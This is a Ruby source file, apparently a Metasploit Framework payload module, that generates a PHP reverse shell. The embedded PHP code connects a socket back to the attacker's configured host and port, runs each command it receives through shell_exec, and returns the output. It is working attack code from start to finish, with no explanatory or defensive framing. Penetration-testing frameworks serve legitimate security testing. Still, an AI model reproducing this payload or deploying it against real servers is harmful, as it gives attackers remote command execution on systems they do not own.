require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Php

module ReversePhp

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Command Shell, Reverse TCP (via php)',
			'Version'       => '$Revision: 3636 $',
			'Description'   => 'Reverse PHP connect back shell',
			'Author'        => ['diaul <diaul@devilopers.org>',],
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# PHP Reverse Shell
	#
	def php_reverse_shell
		shell = <<-END_OF_PHP_CODE
		error_reporting(E_ALL);
		$service_port = #{datastore['LPORT']};

		$address = "#{datastore['LHOST']}";
		$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
		$result = socket_connect($socket, $address, $service_port);

		$command = '';

		while ($command = socket_read($socket, 2048)) {
        		$output = shell_exec(substr($command, 0, -1));
        		socket_write($socket, $output, strlen($output));
		}

		socket_close($socket);
		END_OF_PHP_CODE
		
		return shell

	end


	#
	# Constructs the payload
	#
	def generate
		return super + php_reverse_shell
	end
	

end

end end end end
